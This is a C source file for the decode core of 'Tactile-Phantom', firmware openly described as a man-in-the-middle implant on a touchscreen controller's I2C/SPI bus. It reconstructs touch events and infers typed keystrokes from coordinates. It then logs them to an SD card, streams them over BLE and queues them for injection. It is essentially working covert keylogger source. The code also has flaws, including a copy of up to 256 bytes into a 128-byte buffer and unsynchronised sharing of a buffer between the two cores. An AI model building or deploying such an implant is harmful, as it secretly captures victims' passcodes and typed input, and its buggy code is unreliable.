/*
 * Tactile-Phantom — Touch-Controller Bus MITM Implant
 * core1.c — Core 1: decode pipeline, event reconstruction
 *
 * Author: jayis1
 * License: GPL-2.0
 *
 * Core 1 runs the decode pipeline:
 *   Stage 1: Frame parser (I2C/SPI transaction assembly from raw bytes)
 *   Stage 2: Protocol classifier (already done by core 0 during auto-detect;
 *            core 1 uses the result from bus_state)
 *   Stage 3: Register-map decoder (maps offsets to semantic types)
 *   Stage 4: Touch decoder (extract coordinates, pressure, gestures)
 *   Stage 5: Event reconstruction (keystroke/pattern inference via layout_infer)
 *
 * Output: decoded events are logged to SD card, streamed over BLE, and
 *         queued for injection scheduling.
 */

#include <string.h>
#include <stdio.h>
#include "pico/stdlib.h"
#include "pico/multicore.h"
#include "hardware/sync.h"

#include "board.h"
#include "registers.h"

/* External references to shared state in main.c */
extern tp_bus_state_t g_bus_state;
extern mutex_t g_state_mutex;

/* --- Raw transaction buffer (fed by core 0) ------------------------- */
/* Core 0 calls core1_submit_raw() with chunks of raw bus data.
 * We assemble complete I2C/SPI transactions here. */
#define MAX_RAW_CHUNK  512
static uint8_t  raw_buf[1024];   /* accumulation buffer */
static uint16_t raw_len = 0;

/* --- I2C transaction parser state ----------------------------------- */
typedef enum {
    I2C_IDLE,
    I2C_ADDR,
    I2C_REG_HIGH,   /* for 16-bit address controllers */
    I2C_REG_LOW,
    I2C_DATA,
    I2C_REPEATED_START,
} i2c_parse_state_t;

static i2c_parse_state_t i2c_state = I2C_IDLE;
static uint8_t  i2c_addr_byte;
static uint8_t  i2c_rw;            /* 0=write, 1=read */
static uint16_t i2c_reg_offset;
static uint8_t  i2c_reg_offset_len; /* 1 or 2 bytes */
static uint8_t  i2c_data_buf[256];
static uint16_t i2c_data_len;
static bool     i2c_16bit_addr;     /* controller uses 16-bit reg addr */

/* --- SPI transaction parser state ---------------------------------- */
typedef enum {
    SPI_IDLE,
    SPI_CS_ASSERTED,
    SPI_DATA,
} spi_parse_state_t;

static spi_parse_state_t spi_state = SPI_IDLE;
static uint8_t  spi_data_buf[256];
static uint16_t spi_data_len;

/* --- Decoded transaction structure --------------------------------- */
typedef struct {
    bool     is_read;
    uint16_t reg_offset;
    uint16_t data_len;
    uint8_t  data[128];
} tp_transaction_t;

/* --- Current transaction being assembled --------------------------- */
static tp_transaction_t current_txn;

/* --- Event queue (for decoded touch events) ------------------------ */
static tp_event_t event_queue[TP_EVENT_QUEUE_DEPTH];
static volatile uint16_t event_head = 0, event_tail = 0;
static mutex_t event_mutex;

/* --- Submit raw data from core 0 ----------------------------------- */
void core1_submit_raw(const uint8_t *data, uint16_t len)
{
    if (len > MAX_RAW_CHUNK) len = MAX_RAW_CHUNK;
    if (raw_len + len > sizeof(raw_buf)) {
        /* Overflow: drop oldest data (shift buffer) */
        uint16_t drop = (raw_len + len) - sizeof(raw_buf);
        memmove(raw_buf, raw_buf + drop, raw_len - drop);
        raw_len -= drop;
    }
    memcpy(raw_buf + raw_len, data, len);
    raw_len += len;
}

/* --- I2C transaction assembly -------------------------------------- */
/* For this design, raw bytes represent the decoded SDA byte stream
 * (each byte is a value read from SDA during a clock burst).
 * In production, the PIO tap program would output structured words
 * containing (SCL_edge, SDA_bit) or assembled bytes. Here we work
 * with byte-level data for the parser. */

static void i2c_process_byte(uint8_t byte, bool is_start, bool is_stop)
{
    switch (i2c_state) {
    case I2C_IDLE:
        if (is_start) {
            i2c_state = I2C_ADDR;
            i2c_data_len = 0;
            i2c_reg_offset = 0;
            i2c_reg_offset_len = 0;
        }
        break;

    case I2C_ADDR:
        if (is_start) {  /* repeated start */
            i2c_state = I2C_ADDR;
            i2c_data_len = 0;
            break;
        }
        i2c_addr_byte = byte >> 1;
        i2c_rw = byte & 1;
        /* Check if this matches our target controller address */
        if (i2c_addr_byte == g_bus_state.i2c_addr) {
            if (i2c_rw == 0) {  /* write: next bytes are register offset */
                i2c_state = I2C_REG_HIGH;
            } else {  /* read: next bytes are data */
                i2c_state = I2C_DATA;
            }
        } else {
            i2c_state = I2C_IDLE;  /* different device */
        }
        break;

    case I2C_REG_HIGH:
        if (i2c_16bit_addr) {
            i2c_reg_offset = (uint16_t)byte << 8;
            i2c_reg_offset_len = 1;
            i2c_state = I2C_REG_LOW;
        } else {
            i2c_reg_offset = byte;
            i2c_reg_offset_len = 1;
            i2c_state = I2C_DATA;
        }
        break;

    case I2C_REG_LOW:
        i2c_reg_offset |= byte;
        i2c_reg_offset_len = 2;
        i2c_state = I2C_DATA;
        break;

    case I2C_DATA:
        if (is_stop || is_start) {
            /* Transaction complete: dispatch to decoder */
            current_txn.is_read = (i2c_rw != 0);
            current_txn.reg_offset = i2c_reg_offset;
            current_txn.data_len = i2c_data_len;
            memcpy(current_txn.data, i2c_data_buf, i2c_data_len);

            /* Feed to touch decoder */
            tp_event_t event;
            bool got_event = tp_decode_transaction(
                (const uint8_t *)&current_txn, sizeof(current_txn),
                &g_bus_state, &event);

            if (got_event) {
                /* Enqueue event */
                mutex_enter_blocking(&event_mutex);
                event_queue[event_tail] = event;
                event_tail = (event_tail + 1) % TP_EVENT_QUEUE_DEPTH;
                mutex_exit(&event_mutex);

                /* Log to storage */
                tp_storage_log_event(&event);

                /* Stream over BLE */
                tp_ble_link_send_event(&event);

                g_bus_state.total_events++;
            }

            if (is_start) {
                i2c_state = I2C_ADDR;
            } else {
                i2c_state = I2C_IDLE;
            }
            i2c_data_len = 0;
        } else {
            if (i2c_data_len < sizeof(i2c_data_buf))
                i2c_data_buf[i2c_data_len++] = byte;
        }
        break;

    default:
        i2c_state = I2C_IDLE;
        break;
    }
}

/* --- SPI transaction assembly -------------------------------------- */
static void spi_process_byte(uint8_t byte, bool cs_asserted, bool cs_released)
{
    if (cs_asserted) {
        spi_state = SPI_DATA;
        spi_data_len = 0;
    }

    if (spi_state == SPI_DATA && !cs_released) {
        if (spi_data_len < sizeof(spi_data_buf))
            spi_data_buf[spi_data_len++] = byte;
    }

    if (cs_released && spi_data_len > 0) {
        /* Complete SPI transaction */
        current_txn.is_read = false;  /* SPI is full-duplex; treat as write */
        current_txn.reg_offset = spi_data_buf[0];  /* first byte = reg addr */
        current_txn.data_len = spi_data_len - 1;
        memcpy(current_txn.data, spi_data_buf + 1, spi_data_len - 1);

        tp_event_t event;
        bool got_event = tp_decode_transaction(
            (const uint8_t *)&current_txn, sizeof(current_txn),
            &g_bus_state, &event);

        if (got_event) {
            mutex_enter_blocking(&event_mutex);
            event_queue[event_tail] = event;
            event_tail = (event_tail + 1) % TP_EVENT_QUEUE_DEPTH;
            mutex_exit(&event_mutex);

            tp_storage_log_event(&event);
            tp_ble_link_send_event(&event);
            g_bus_state.total_events++;
        }

        spi_state = SPI_IDLE;
        spi_data_len = 0;
    }
}

/* --- Raw byte stream processor ------------------------------------ */
/* This processes the raw byte buffer. In the production firmware, the
 * PIO tap program would provide structured data with START/STOP flags.
 * Here, we use a heuristic: byte 0x00 as a sentinel for frame boundaries.
 *
 * Format (heuristic for this design):
 *   0xFF = START condition
 *   0xFE = STOP condition
 *   0xFD = REPEATED START
 *   0x00..0xFC = data byte
 * For SPI:
 *   0xFB = CS asserted
 *   0xFA = CS released
 */
#define SENTINEL_I2C_START  0xFF
#define SENTINEL_I2C_STOP   0xFE
#define SENTINEL_I2C_REPSTART 0xFD
#define SENTINEL_SPI_CS_ON  0xFB
#define SENTINEL_SPI_CS_OFF 0xFA

static void process_raw_buffer(void)
{
    uint16_t processed = 0;

    while (processed < raw_len) {
        uint8_t byte = raw_buf[processed++];

        if (g_bus_state.mode == TP_BUS_SPI) {
            bool cs_on  = (byte == SENTINEL_SPI_CS_ON);
            bool cs_off = (byte == SENTINEL_SPI_CS_OFF);
            if (cs_on || cs_off) {
                spi_process_byte(0, cs_on, cs_off);
            } else if (byte <= 0xF9) {
                spi_process_byte(byte, false, false);
            }
        } else {
            /* I2C mode */
            bool start = (byte == SENTINEL_I2C_START);
            bool stop  = (byte == SENTINEL_I2C_STOP);
            bool repstart = (byte == SENTINEL_I2C_REPSTART);
            if (start || stop || repstart) {
                i2c_process_byte(0, start || repstart, stop);
            } else if (byte <= 0xFC) {
                i2c_process_byte(byte, false, false);
            }
        }
    }

    /* All bytes consumed */
    raw_len = 0;
}

/* --- Core 1 main loop ---------------------------------------------- */
void core1_main(void)
{
    printf("[TP] Core 1 started: decode pipeline\n");

    mutex_init(&event_mutex);

    /* Set 16-bit address flag based on detected vendor */
    const tp_vendor_map_t *vmap = tp_vendor_get(g_bus_state.vendor);
    i2c_16bit_addr = vmap ? vmap->addr_16bit : false;

    uint32_t last_process = 0;

    while (true) {
        /* Process any new raw data from core 0 */
        if (raw_len > 0) {
            process_raw_buffer();
        }

        /* Periodic layout inference update (every 500 ms) */
        uint32_t now = time_us_32();
        if (now - last_process >= 500000) {
            last_process = now;
            /* Drain event queue and run layout inference on events */
            while (event_head != event_tail) {
                mutex_enter_blocking(&event_mutex);
                tp_event_t ev = event_queue[event_head];
                event_head = (event_head + 1) % TP_EVENT_QUEUE_DEPTH;
                mutex_exit(&event_mutex);

                /* If this is a touch event, try to infer keystroke */
                if (ev.type == TP_EV_TOUCH && ev.finger_count > 0) {
                    char ch = 0;
                    if (tp_layout_infer_keystroke(
                            ev.fingers[0].x, ev.fingers[0].y, &ch)) {
                        printf("[TP] Keystroke: '%c' (%u, %u)\n",
                               ch, ev.fingers[0].x, ev.fingers[0].y);
                    }
                }
            }
        }

        sleep_ms(1);  /* yield to avoid 100% CPU */
    }
}